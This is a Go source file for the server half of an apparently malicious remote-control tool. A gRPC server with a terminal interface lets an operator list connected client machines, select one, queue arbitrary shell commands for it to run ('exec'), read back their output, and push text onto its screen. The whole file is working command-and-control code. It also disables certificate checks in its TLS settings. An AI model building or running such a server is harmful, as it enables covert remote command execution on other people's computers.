// TODO: use [this](https://github.com/c-bata/go-prompt) instead of [this](https://github.com/charmbracelet/bubbletea)
package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	pb "github.com/Xart3mis/AKILTC/pb"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/fatih/color"
	"github.com/magodo/textinput"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

type server struct {
	pb.ConsumerServer
}

var current_id string = ""

var client_ids []string
var client_mapids map[int]string = make(map[int]string)

var client_onscreentext map[string]string = make(map[string]string)
var client_execcommand map[string]string = make(map[string]string)
var client_execoutput map[string]string = make(map[string]string)

func main() {
	go func() {
		p := tea.NewProgram(initialModel(), tea.WithAltScreen())

		if err := p.Start(); err != nil {
			log.Fatal(err)
		}
	}()

	creds, err := loadTLSCredentials()
	if err != nil {
		log.Fatalln(err)
	}

	s := grpc.NewServer(grpc.Creds(creds))
	lis, err := net.Listen("tcp", ":8000")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	pb.RegisterConsumerServer(s, &server{})

	err = s.Serve(lis)
	if err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}

}

func loadTLSCredentials() (credentials.TransportCredentials, error) {
	// Load server's certificate and private key
	serverCert, err := tls.LoadX509KeyPair("./../cert/server-cert.pem", "./../cert/server-key.pem")
	if err != nil {
		return nil, err
	}

	// Create the credentials and return it
	config := &tls.Config{
		Certificates:       []tls.Certificate{serverCert},
		ClientAuth:         tls.NoClientCert,
		InsecureSkipVerify: true,
	}

	return credentials.NewTLS(config), nil
}

func Contains(sl []string, name string) bool {
	for _, value := range sl {
		if value == name {
			return true
		}
	}
	return false
}

func (s *server) GetCommand(ctx context.Context, cid *pb.ClientDataRequest) (*pb.ClientExecData, error) {
	if !Contains(client_ids, cid.ClientId) {
		client_ids = append(client_ids, cid.ClientId)
	}

	if cid.ClientId == current_id && cid != nil {
		x := client_execcommand[current_id]
		client_execcommand[current_id] = ""
		return &pb.ClientExecData{
			ShouldExec: len(x) > 0,
			Command:    x}, nil
	}
	return &pb.ClientExecData{}, nil
}

func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) (*pb.Void, error) {
	if id := in.GetId(); id != nil {
		if id.ClientId == current_id {
			client_execoutput[current_id] = ""
			client_execoutput[current_id] = string(in.GetOutput())
		}
	}

	return &pb.Void{}, nil
}

func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
	if !Contains(client_ids, r.ClientId) {
		client_ids = append(client_ids, r.ClientId)
	}
	for {
		if r.GetClientId() == current_id {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: len(client_onscreentext[current_id]) > 0,
				OnScreenText: client_onscreentext[current_id]}})
		} else {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: false,
				OnScreenText: ""}})
		}
		time.Sleep(250 * time.Millisecond)
	}
}

type model struct {
	textInput           textinput.Model
	typing              bool
	showhelplist        bool
	showclientlist      bool
	showok              bool
	shownotvalidcid     bool
	shownotvalidtext    bool
	shownotvalidcommand bool
	showexecout         bool
	err                 error
	clients             []string
}

func initialModel() model {
	ti := textinput.NewModel()
	ti.Placeholder = "help"

	red := color.New(color.FgRed).SprintFunc()
	ti.Prompt = red(">> ")
	ti.PromptStyle.Bold(true)

	ti.PromptStyle.PaddingRight(10)
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = 20

	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients", "cleartext"}
	ti.StyleCandidate.Foreground(lipgloss.Color("#BC4749"))
	ti.CandidateViewMode = textinput.CandidateViewHorizental

	return model{
		textInput:           ti,
		err:                 nil,
		typing:              true,
		showhelplist:        false,
		showok:              false,
		showclientlist:      false,
		shownotvalidcid:     false,
		shownotvalidtext:    false,
		shownotvalidcommand: false,
		showexecout:         false,
		clients:             client_ids,
	}
}

func (m model) Init() tea.Cmd {
	return textinput.Blink
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd

	for idx, client := range client_ids {
		client_mapids[idx] = client
	}

	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			os.Exit(0)
			return m, tea.Quit

		case "esc", "q":
			m.shownotvalidcommand = false
			m.shownotvalidtext = false
			m.shownotvalidcid = false
			m.showclientlist = false
			m.showhelplist = false
			m.showexecout = false
			m.showok = false
			return m, nil

		case "enter":
			m.clients = client_ids

			if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) <= 1 {
					m.shownotvalidcommand = true
					return m, nil
				}
				client_execcommand[current_id] = strings.Join(split_str[1:], " ")
				m.showexecout = true
				return m, nil
			}

			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) > 2 {
					panic("select only takes 1 argument")
				}
				val, err := strconv.Atoi(split_str[1])
				if err != nil {
					m.shownotvalidcid = true
					return m, nil
				}

				if Contains(client_ids, client_mapids[val]) {
					m.showok = true
					current_id = client_mapids[val]
					return m, nil
				}

				m.shownotvalidcid = true
				return m, nil
			}

			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) <= 1 {
					m.shownotvalidtext = true
					return m, nil
				}
				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
				m.showok = true
				return m, nil
			}

			if len(m.textInput.Value()) == 9 && m.textInput.Value() == "cleartext" {
				client_onscreentext[current_id] = ""
				m.showok = true
				return m, nil
			}

			switch m.textInput.Value() {
			case "help":
				m.showhelplist = true
				return m, nil
			case "exit":
				return m, tea.Quit
			case "list_clients":
				m.showclientlist = true
				return m, nil
			default:
				return m, nil
			}
		}
	case error:
		m.err = msg
		return m, nil
	}

	m.textInput, cmd = m.textInput.Update(msg)
	return m, cmd

}

func (m model) View() string {
	if m.showhelplist {
		yellow := color.New(color.FgYellow).SprintFunc()
		green := color.New(color.FgGreen).SprintFunc()

		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
			green("select") + "\nselect a client to connect to (usage: " + yellow("select [`client id`]") + ")\n\n" +
			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n\n" +
			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")"
	}
	if m.showclientlist {
		Magenta := color.New(color.FgMagenta).SprintFunc()
		b, _ := json.MarshalIndent(client_mapids, "", "\t")
		return m.textInput.View() + "\n\n" + Magenta(string(b))
	}
	if m.shownotvalidcid {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("Not a valid client ID.")
	}
	if m.showok {
		Green := color.New(color.FgGreen).SprintFunc()
		return m.textInput.View() + "\n\n" + Green("OK.")
	}
	if m.shownotvalidtext {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("settext takes multiple arguments.")
	}
	if m.showexecout {
		x := client_execoutput[current_id]
		return m.textInput.View() + "\n\n" + x
	}
	if m.shownotvalidcommand {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("Not a valid command.")
	}
	return m.textInput.View()
}
